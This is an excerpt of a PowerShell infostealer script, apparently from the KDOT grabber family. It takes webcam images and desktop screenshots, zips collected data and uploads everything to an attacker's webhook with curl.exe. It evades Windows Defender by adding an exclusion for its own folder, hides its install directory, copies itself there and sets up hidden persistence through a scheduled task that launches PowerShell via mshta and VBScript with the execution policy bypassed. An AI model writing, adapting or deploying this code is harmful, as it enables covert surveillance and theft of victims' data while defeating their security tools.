...
function Backup-Data {
    ...
    $embed_and_body = @{
        ...
        "description" = "OPCLEAN"
        "color" = "3447003"
        "avatar_url" = "https://i.gifer.com/VhkF.gif"
        "url" = "https://i.gifer.com/TPZa.gif"
        "embeds" = @(
            @{
                "title" = "DEV [OP_CLEAN]"
                "url" = "https://i.gifer.com/VhkF.gif"
...
"@ 
 ...
 try {Get-WebCamImage} catch {}
    ...
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"DEV\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
    ...
    curl.exe -F "payload_json={\`"username\`": \`"DEV\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$main_temp\desktop-screenshot.png\`"" $webhook | out-null
    ...
    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\DEV.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"DEV\", \"content\": \"\", \"avatar_url\": \"https://i.gifer.com/RYba.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\DEV.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\DEV.zip" -Force
...
function Invoke-TASKS {
    ...
    Add-MpPreference -ExclusionPath "$env:APPDATA\DEV"
    New-Item -ItemType Directory -Path "$env:APPDATA\DEV" -Force
    # Hidden Directory
    $KDOT_DIR = get-item "$env:APPDATA\DEV" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\DEV\DEV.ps1" -Force
    $task_name = "DEV"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\DEV\DEV.ps1",0)(window.close)'
